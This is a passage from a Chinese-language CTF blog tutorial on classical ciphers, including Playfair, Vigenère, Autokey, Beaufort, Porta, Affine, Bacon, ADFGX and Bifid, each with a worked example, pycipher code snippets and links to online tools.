src="C:%5CUsers%5C888888%5CDesktop%5C%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%5CCTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F%5C%E5%A4%8F%E5%A4%9A%E5%AF%86%E7%A0%81.png" alt=""></p><p>注意，在以上所示的字母表密钥的底部，列有四个附加符号1，2，3，4.他们可以放在密文中的任何地方。每个附加符号指示，如何转动写有密文的纸张，再进行后续的加密或解密操作，直到出现另一个附加符号。可以把每个附加符号中的那根线看作是指示针，它指示了纸张的上端朝上，朝右，朝下，朝左。比如说：如果出现符号3，那么纸张就应该转动180度，使其上端朝下； 符号2表示纸张上端朝右，依次类推。</p><h4 id="9-普莱菲尔密码">9.普莱菲尔密码</h4><p>普莱菲尔密码(Playfair Cipher)是第一种用于实际的双字替换密码，用双字加密取代了简单代换密码的单字加密，很明显这样使得密文更难破译，因为使用简单替换密码的频率分析基本没有什么作用，虽然频率分析，通常仍然可以进行，但是有25×25=625种可能而不是25种可能，可以分为三个步骤，即编制密码表、整理明文、编写译文，下面我们以明文：</p><p><code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code> 和密钥 <code>CULTURE</code> 为例来讲解。普莱菲尔密码又称为单方密码(Single Cipher)之后又出现它的升级版Double Playfair，也就是 <a href="https://en.wikipedia.org/wiki/Two-square_cipher">二方密码</a> (Two-square Cipher),在之后又有四方密码(Four-square Cipher)</p><h5 id="9-1编制密码表">9.1编制密码表</h5><ol><li><p>整理密钥字母 <code>C U L T U R E</code> ，去掉后面重复的字母得到： <code>C U L T R E</code></p></li><li><p>用上一步得到的字母自上而下来填补5乘5方表的纵列（也可横排），之后的空白按照相同的顺序用字母表中剩余的字母依次填补完整，得到如下的方格:</p></li></ol><p><img src="https://upload-images.jianshu.io/upload_images/3259472-63838217233bb6d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><p>这一步需要注意的要点：整理密钥字母时，如果出现&quot;Z&quot;，则需要去除，因为在英文里&quot;Z&quot;的使用频率最低，相应的如果是德文，则需将&quot;I&quot;与&quot;J&quot;当作一个字母来看待，而法语则去掉&quot;W&quot;或&quot;K&quot;</p><h5 id="9-2整理明文">9.2整理明文</h5><p>我们要遵循的原则是“两个一组”，得到是若干个两两成对的字母段，用到的是明文 <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code> 与字母&quot; <code>X</code> &quot;：</p><ol><li><p>将明文两两一组按顺序排开，得到： <code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO G</code></p></li><li><p>对于末尾的单个字母要加上一个&quot; <code>X</code> &quot;使之成对： <code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p></li><li><p>这一步需要注意的要点：对于相连字母相同者，每个后面都需要加&quot; <code>X</code> &quot;，例如 <code>TOMORROW</code> ，需要写成： <code>TO MO RX RX OW</code> 。</p></li></ol><h5 id="9-3编写密文">9.3编写密文</h5><p>我们要得到的密文，当然，对于每个字母对，要严格遵循如下的原则：</p><ol><li><p>如果两个字母在同一行则要用它右邻的字母替换，如果已在最右边，则用该行最左边的替换，如明文为&quot; <code>CE</code> “，依据上表，应替换为” <code>EG</code> &quot;；</p></li><li><p>如果两个字母在同一列则要用它下边的字母替换，如果已在最下边，则用该行最上边的替换，如明文为&quot; <code>OQ</code> “，依据上表，应替换为” <code>PS</code> &quot;；</p></li><li><p>如果两个字母在不同的行或列，则应在密码表中找两个字母使四个字母组成一个矩形，明文占据两个顶点，需用另外两个顶点的字母替换，如明文为&quot; <code>HX</code> “，可以替换为” <code>WI/J</code> “或” <code>I/JW</code>&quot;（下面的例子将按照横向替换原则即同行优先）。</p></li></ol><p>按照上述原则，将明文 <code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code> 加以转换得到 <code>KU ND LH GT LF WU ES PW LH SI/J NP CG CR AG BU VZ QA I/JV</code> （/表示或者，不过一般用I不用J，所以分析密文时你看25个字母都有而只差一个字母没有用到可以考虑一下这种加密方式）将得到的字母改为大写并五个一组列好，得到密文 <code>KUNDL HGTLF WUESP WLHSI NPCGC RAGBU VZQAI V</code> 。</p><p>加密解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/">传送门</a> (ps：这里加解密是横向编制密码表)</p><p>加密解密实例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pycipher <span class="token keyword">import</span> Playfair<span class="token operator">>></span><span class="token operator">></span>Playfair<span class="token punctuation">(</span><span class="token string">'CULTREABDFGHIKMNOPQSVWXYZ'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encipher<span class="token punctuation">(</span><span class="token string">'THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG'</span><span class="token punctuation">)</span><span class="token string">'UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV'</span><span class="token operator">>></span><span class="token operator">></span>Playfair<span class="token punctuation">(</span><span class="token string">'CULTREABDFGHIKMNOPQSVWXYZ'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decipher<span class="token punctuation">(</span><span class="token string">'UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV'</span><span class="token punctuation">)</span><span class="token string">'THEQUICKBROWNFOXIUMPSOVERTHELAZYDOGX'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10-维吉尼亚密码">10.维吉尼亚密码</h4><blockquote><p>维吉尼亚密码(Vigenère Cipher)是在单一恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换，以此来对抗字频统计，更多 <a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">参考</a> 。</p></blockquote><p><strong>密表：</strong></p><img src="https://upload-images.jianshu.io/upload_images/3259472-f39d673fef9cb605.png?imageMogr2/auto-orient/strip|imageView2/2/format/webp" style="zoom:50%;" /><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)： <code>CULTURE</code></p><p>加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母’T’列和密钥字母’C’行的交点就是密文字母’V’，以此类推。</p><p>密文： <code>VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK</code></p><p><strong>已知密钥加解密</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pycipher <span class="token keyword">import</span> Vigenere<span class="token operator">>></span><span class="token operator">></span>Vigenere<span class="token punctuation">(</span><span class="token string">'CULTURE'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encipher<span class="token punctuation">(</span><span class="token string">'THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG'</span><span class="token punctuation">)</span><span class="token string">'VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK'</span><span class="token operator">>></span><span class="token operator">></span>Vigenere<span class="token punctuation">(</span><span class="token string">'CULTURE'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decipher<span class="token punctuation">(</span><span class="token string">'VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK'</span><span class="token punctuation">)</span><span class="token string">'THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在线加密解密 <a href="http://planetcalc.com/2468/">传送门</a></p><p><strong>未知密钥破解</strong></p><p>可以参考 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/">维吉尼亚密码分析</a> 这篇文章，破解维吉尼亚密码第一步是确定密钥长度，维吉尼亚密码分析这篇文章里介绍了使用 <a href="https://en.wikipedia.org/wiki/Index_of_coincidence">重合指数</a> 算法来确定密钥长度，在确定密钥长度后就可以尝试确定密钥，通常我们可以使用 <a href="https://en.wikipedia.org/wiki/Chi-squared_test">卡方检验</a> 来找到每个字母的偏移量，基于维吉尼亚密码分析一文中的算法实现的工具破解示例。</p><p><strong>变种</strong></p><p>有几种密码和维吉尼亚密码相似，格罗斯费尔德密码(Gronsfeld cipher)实际上和维吉尼亚密码相同，除了使用了数字来代替字母以外没有什么区别。数字可以选择一种数列，如斐波那契数列，或者一些其他的伪随机序列。格罗斯费尔德密码密码分析过程和维吉尼亚密码大同小异，不过，自动密钥密码不能使用 <a href="http://www.zybang.com/question/a0a1108423f63d10dbbf0c3e1bfdf3b3.html">卡西斯基算法</a> (kasiski)来破译，因为自动密钥密码的密钥不重复循环使用，破译自动密钥密码最好的方法的就是从密文不断尝试和猜测其中明文或密钥的一部分。</p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-435abc56d033b910.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pycipher <span class="token keyword">import</span> Gronsfeld<span class="token operator">>></span><span class="token operator">></span>Gronsfeld<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encipher<span class="token punctuation">(</span><span class="token string">'THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG'</span><span class="token punctuation">)</span><span class="token string">'VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK'</span><span class="token operator">>></span><span class="token operator">></span>Gronsfeld<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decipher<span class="token punctuation">(</span><span class="token string">'VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK'</span><span class="token punctuation">)</span><span class="token string">'THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在线加解密 <a href="http://rumkin.com/tools/cipher/gronsfeld.php">传送门</a></p><h4 id="11-自动密钥密码">11.自动密钥密码</h4><p>自动密钥密码(Autokey Cipher)是多表替换密码，与维吉尼亚密码密切相关，但使用不同的方法生成密钥，通常来说要比维吉尼亚密码更安全。自动密钥密码主要有两种，关键词自动密钥密码和原文自动密钥密码.</p><p>以关键词自动密钥为例：</p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>关键词： <code>CULTURE</code></p><p>自动生成密钥： <code>CULTURE THE QUICK BROWN FOX JUMPS OVER THE</code></p><p>接下来的加密过程和维吉尼亚密码类似，从密表可得：</p><p>密文： <code>VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK</code></p><p><strong>已知关键词加解密</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pycipher <span class="token keyword">import</span> Autokey<span class="token operator">>></span><span class="token operator">></span>Autokey<span class="token punctuation">(</span><span class="token string">'CULTURE'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encipher<span class="token punctuation">(</span><span class="token string">'THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG'</span><span class="token punctuation">)</span><span class="token string">'VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK'</span><span class="token operator">>></span><span class="token operator">></span>Autokey<span class="token punctuation">(</span><span class="token string">'CULTURE'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decipher<span class="token punctuation">(</span><span class="token string">'VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK'</span><span class="token punctuation">)</span><span class="token string">'THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/autokey/">传送门</a></p><p><strong>未知关键词破解</strong></p><p>推荐去看这篇 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/">自动密钥密码分析文章</a> ，基于文中的算法实现的工具来破解示例</p><h4 id="12-博福特密码">12.博福特密码</h4><p>博福特密码(Beaufort Cipher)，是一种类似于维吉尼亚密码的代换密码，由弗朗西斯·蒲福(Francis Beaufort)发明。它最知名的应用是Hagelin M-209密码机。博福特密码属于对等加密，即加密演算法与解密演算法相同。</p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)： <code>CULTURE</code></p><p>加密过程：如果第一行为明文字母，第一列为密文字母，那么沿明文字母’T’列出现密钥字母’C’的行号就是密文字母’J’，以此类推。</p><p>密文： <code>JNH DAJCS TUFYE ZOX CZICM OZHC BKA RUMV RDY</code></p><p><strong>已知密钥加解密</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pycipher <span class="token keyword">import</span> Beaufort<span class="token operator">>></span><span class="token operator">></span>Beaufort<span class="token punctuation">(</span><span class="token string">'CULTURE'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encipher<span class="token punctuation">(</span><span class="token string">'THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG'</span><span class="token punctuation">)</span><span class="token string">'JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY'</span><span class="token operator">>></span><span class="token operator">></span>Beaufort<span class="token punctuation">(</span><span class="token string">'CULTURE'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decipher<span class="token punctuation">(</span><span class="token string">'JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY'</span><span class="token punctuation">)</span><span class="token string">'THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/beaufort/">传送门</a></p><h4 id="13-滚动密钥密码">13.滚动密钥密码</h4><p>滚动密钥密码(Running Key Cipher)和维吉尼亚密码有着相同的加密机制，区别是密钥的选取，维吉尼亚使用的密钥简短，而且重复循环使用，与之相反，滚动密钥密码使用很长的密钥，比如引用一本书作为密钥。这样做的目的是不重复循环使用密钥，使密文更难破译，尽管如此，滚动密钥密码还是可以被攻破，因为有关于密钥和明文的统计分析模式可供利用，如果滚动密钥密码使用统计上的随机密钥来源，那么理论上是不可破译的，因为任何可能都可以成为密钥，并且所有的可能性都是相等的。</p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥：选取C语言编程(1978版)第63页第1行&quot;errors can occur in several places. A label has…&quot;，去掉非字母部分作为密钥(实际选取的密钥很长，长度至少不小于明文长度)。</p><p>加密过程：加密过程和维吉尼亚密码加密过程相同</p><p>密文: <code>XYV ELAEK OFQYH WWK BYHTJ OGTC TJI DAK YESR</code></p><p>已知密钥在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/running-key/">传送门</a></p><h4 id="14-porta密码">14.Porta密码</h4><p>Porta密码(Porta Cipher)是一个由意大利那不勒斯的医生Giovanni Battista della Porta发明的多表代换密码，Porta密码具有加密解密过程的是相同的特点。</p><pre class="line-numbers language-none"><code class="language-none">KEYS| A B C D E F G H I J K L M N O P Q R S T U V W X Y Z----|----------------------------------------------------A,B | N O P Q R S T U V W X Y Z A B C D E F G H I J K L MC,D | O P Q R S T U V W X Y Z N M A B C D E F G H I J K LE,F | P Q R S T U V W X Y Z N O L M A B C D E F G H I J KG,H | Q R S T U V W X Y Z N O P K L M A B C D E F G H I JI,J | R S T U V W X Y Z N O P Q J K L M A B C D E F G H IK,L | S T U V W X Y Z N O P Q R I J K L M A B C D E F G HM,N | T U V W X Y Z N O P Q R S H I J K L M A B C D E F GO,P | U V W X Y Z N O P Q R S T G H I J K L M A B C D E FQ,R | V W X Y Z N O P Q R S T U F G H I J K L M A B C D ES,T | W X Y Z N O P Q R S T U V E F G H I J K L M A B C DU,V | X Y Z N O P Q R S T U V W D E F G H I J K L M A B CW,X | Y Z N O P Q R S T U V W X C D E F G H I J K L M A BY,Z | Z N O P Q R S T U V W X Y B C D E F G H I J K L M A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)： <code>CULTURE</code></p><p>加密过程：明文字母’T’列与密钥字母’C’行交点就是密文字母’F’,以此类推。</p><p>密文： <code>FRW HKQRY YMFMF UAA OLWHD ALWI JPT ZXHC NGV</code></p><p>已知密钥在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/porta/">传送门</a></p><p><strong>破解</strong></p><p>Porta密码可以被以 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher-part-2/">维吉尼亚密码</a> 破解相类似方式进行自动攻破，破解Porta密码第一步是先确定密钥长度，这里推荐一篇关于使用 <a href="https://en.wikipedia.org/wiki/Index_of_coincidence">重合指数算法</a> 确定为维吉尼亚密钥长度 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/">文章</a> 。</p><h4 id="15-同音替换密码">15.同音替换密码</h4><p>同音替换密码(Homophonic Substitution Cipher)是单字母可以被其他几种密文字母同时替换的密码，通常要比标准替换密码破解更加困难，破解标准替换密码最简单的方法就是分析字母出现频率，通常在英语中字母’E’(或’T’)出现的频率是最高的，如果我们允许字母’E’可以同时被3种不同字符代替，那么就不能还是以普通字母的频率来分析破解，如果允许可代替字符越多，那么密文就会更难破译。</p><p>常见代换规则表：</p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-435abc56d033b910.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><p>明文: <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文(其中一种)： <code>6CZ KOVST XJ0MA EQY IOGL4 0W1J UC7 P9NB F0H</code></p><p><strong>破解</strong></p><p>如果同音替换密码的同音词个数很多，那么破解它难度很大，通常的方法采取类似破解替换密码的&quot;爬山算法&quot;，除了找到一个明文字母映射几个字符之外，我们还需要确定映射了那些字符，可以尝试 <a href="http://www.cs.sjsu.edu/faculty/stamp/RUA/homophonic.pdf">2层嵌套&quot;爬山算法&quot;</a> 来破解，外层确定映射的数量，内层确定映射字符。</p><h4 id="16-仿射密码">16.仿射密码</h4><p>仿射密码(Affine Cipher)是一种单表代换密码，字母表中的每个字母相应的值使用一个简单的数学函数映射到对应的数值，再把对应数值转换成字母。这个公式意味着每个字母加密都会返回一个相同的字母，意义着这种加密方式本质上是一种标准替代密码。因此，它具有所有替代密码的弱点。每一个字母都是通过函数（ax + b）mod m加密，其中B是位移量，为了保证仿射密码的可逆性，a和m需要满足gcd(a , m)=1，一般m为设置为26。更多 <a href="https://en.wikipedia.org/wiki/Affine_cipher">参考</a></p><p><strong>常见的字母对应关系：</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-e99fb5e82684bce8.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><p>下面我们以E(x) = (5x + 8) mod 26函数为例子</p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-560cafa2026b103a.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><p>至于解密我们知道</p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-e838ce4fb2c41231.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><p>即可得出解密结果</p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-e662bf62cb40699e.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><p>以E(x) = (5x + 8) mod 26加密，通过计算可得D(x)=21(x - 8) mod 26，这样便可以得到明文。</p><p>加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/affine/">传送门</a></p><h4 id="17-培根密码">17.培根密码</h4><p>培根密码 [Baconian Cipher] 是一种替换密码，每个明文字母被一个由5字符组成的序列替换，最初的加密方式就是由’A’和’B’组成序列替换明文</p><pre class="line-numbers language-none"><code class="language-none">#!shellA &#x3D; aaaaa  I&#x2F;J &#x3D; abaaa  R &#x3D; baaaaB &#x3D; aaaab  K &#x3D; abaab    S &#x3D; baaabC &#x3D; aaaba  L &#x3D; ababa    T &#x3D; baabaD &#x3D; aaabb  M &#x3D; ababb    U&#x2F;V &#x3D; baabbE &#x3D; aabaa  N &#x3D; abbaa    W &#x3D; babaaF &#x3D; aabab  O &#x3D; abbab    X &#x3D; bababG &#x3D; aabba  P &#x3D; abbba    Y &#x3D; babbaH &#x3D; aabbb  Q &#x3D; abbbb    Z &#x3D; babbb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明文： <code>T H E F O X</code></p><p>密文： <code>baaba aabbb aabaa aabab abbab babab</code></p><p>加解密 <a href="http://rumkin.com/tools/cipher/baconian.php">传送门</a></p><h4 id="18-adfgx和adfgvx密码">18.ADFGX和ADFGVX密码</h4><h5 id="18-1adfgx密码">18.1ADFGX密码</h5><p>ADFGX密码(ADFGX Cipher)是结合了改良过的Polybius方格替代密码与单行换位密码的矩阵加密密码，使用了5个合理的密文字母：A，D，F，G，X，这些字母之所以这样选择是因为当转译成摩尔斯电码(ADFGX密码是德国军队在一战发明使用的密码)不易混淆，目的是尽可能减少转译过程的操作错误。</p><p>加密矩阵示例：</p><pre class="line-numbers language-none"><code class="language-none">    A  D  F  G   X  ----------------A | p  h  q  g   m D | e  a  y  n   o F | f  d  x  k   rG | c  v  s  z   w X | b  u  t  i&#x2F;j l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明文： <code>THE QUICK BROWN FOX</code></p><p>结果矩阵加密：</p><pre class="line-numbers language-none"><code class="language-none">XF AD DA   AF XD XG GA FG   XA FX DX GX DG   FA DX FF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列移位密钥： <code>how are u</code></p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-d316d7a4d1cc8817.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><p>密文： <code>DXADF AGXF XFFXD FXGGX DGFG AADA ADXXF</code></p><p>已知密钥加解密：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pycipher <span class="token keyword">import</span> ADFGX<span class="token operator">>></span><span class="token operator">></span>a <span class="token operator">=</span> ADFGX<span class="token punctuation">(</span><span class="token string">'phqgmeaynofdxkrcvszwbutil'</span><span class="token punctuation">,</span><span class="token string">'HOWAREU'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span>a<span class="token punctuation">.</span>encipher<span class="token punctuation">(</span><span class="token string">'THE QUICK BROWN FOX'</span><span class="token punctuation">)</span><span class="token string">'DXADFAGXFXFFXDFXGGXDGFGAADAADXXF'</span><span class="token operator">>></span><span class="token operator">></span>a<span class="token punctuation">.</span>decipher<span class="token punctuation">(</span><span class="token string">'DXADFAGXFXFFXDFXGGXDGFGAADAADXXF'</span><span class="token punctuation">)</span><span class="token string">'THEQUICKBROWNFOX'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/adfgx-cipher/">传送门</a></p><h5 id="18-2adfgvx密码">18.2ADFGVX密码</h5><p>ADFGVX密码实际上就是ADFGX密码的扩充升级版，一样具有ADFGX密码相同的特点，加密过程也类似，不同的是密文字母增加了V，使得可以再使用10数字来替换明文。</p><pre class="line-numbers language-none"><code class="language-none">    A D F G V X  -------------A | p h 0 q g 6D | 4 m e a 1 yF | l 2 n o f dG | x k r 3 c vV | s 5 z w 7 bX | j 9 u t i 8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于两种加密过程完全类似这里就不再重复给出加密过程。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pycipher <span class="token keyword">import</span> ADFGVX<span class="token operator">>></span><span class="token operator">></span>a <span class="token operator">=</span> ADFGVX<span class="token punctuation">(</span><span class="token string">'ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8'</span><span class="token punctuation">,</span><span class="token string">'HOWAREU'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span>a<span class="token punctuation">.</span>encipher<span class="token punctuation">(</span><span class="token string">'THE QUICK BROWN FOX'</span><span class="token punctuation">)</span><span class="token string">'DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG'</span><span class="token operator">>></span><span class="token operator">></span>a<span class="token punctuation">.</span>decipher<span class="token punctuation">(</span><span class="token string">'DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG'</span><span class="token punctuation">)</span><span class="token string">'THEQUICKBROWNFOX'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="19-双密码">19.双密码</h4><p>双密码(Bifid Cipher)结合了波利比奥斯方阵换位密码，并采用分级实现扩散，这里的“双”是指用2个密钥进行加密。双密码是由法国Felix Delastelle发明，除此之外Felix Delastelle还发明了三分密码(Trifid Cipher)，四方密码(Four-Square Cipher)。还有一个 <a href="https://en.wikipedia.org/wiki/Two-square_cipher">两方密码</a> (Two-Square)与四方密码类似， <a href="http://www.thonky.com/kryptos/cm-bifid-cipher">共轭矩阵双密码</a> (Conjugated Matrix Bifid Cipher)也是双密码的变种。</p><p>示例密阵:</p><pre class="line-numbers language-none"><code class="language-none">   1 2 3 4 51| p h q g m2| e a y l n3| o f d x k4| r c v s z5| w b u t i&#x2F;j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明文: <code>THE QUICK BROWN FOX</code></p><p>经过密阵转换：</p><p>行: <code>512 15543 54352 333</code></p><p>列: <code>421 33525 21115 214</code></p><p>分组:</p><p>51215 54354 35233 3</p><p>42133 52521 11521 4</p><pre class="line-numbers language-none"><code class="language-none">5121542133 5435452521 3523311521 34<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在经过密阵转换后密文: <code>WETED TKZNE KYOME X</code></p><p><strong>已知密阵加解密</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pycipher <span class="token keyword">import</span><span class="token operator">>></span><span class="token operator">></span>Bifid<span class="token punctuation">(</span><span class="token string">'phqgmeaylnofdxkrcvszwbuti'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encipher<span class="token punctuation">(</span><span class="token string">'THE QUICK BROWN FOX'</span><span class="token punctuation">)</span><span class="token string">'WETEDTKZNEKYOMEX'</span><span class="token operator">>></span><span class="token operator">></span>Bifid<span class="token punctuation">(</span><span class="token string">'phqgmeaylnofdxkrcvszwbuti'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decipher<span class="token punctuation">(</span><span class="token string">'WETEDTKZNEKYOMEX'</span><span class="token punctuation">)</span><span class="token string">'THEQUICKBROWNFOX'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/bifid/">传送门</a></p><p><strong>未知密阵破解</strong></p><p>手工分析破解双密码是有一定难度的，每个字母都是同过3个数字进行非线性代替转换，而且之后还会对字母顺序进行打乱，这样使双密码比一些替换密码和换位密码更难破解。然而，现在是计算机时代，这张加密方式没有安全性可言，通过 <a href="http://baike.baidu.com/link?url=mkceUr0W4L7B7UVQxc-dUkXKPJbj9v4YyBh_hrskt5iXk99UdnjW6mZ_YxoJO1PkT1zdjEZD2hd7TCMiSxpOma">模拟退火</a> 算法就能快速找到双密码的密阵。 这里推荐一篇详细的 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-bifid-cipher/">双密码破解分析</a> 的文章，基于模拟退火算法实现的工具破解示例：</p><p>密文:</p><pre class="line-numbers language-none"><code 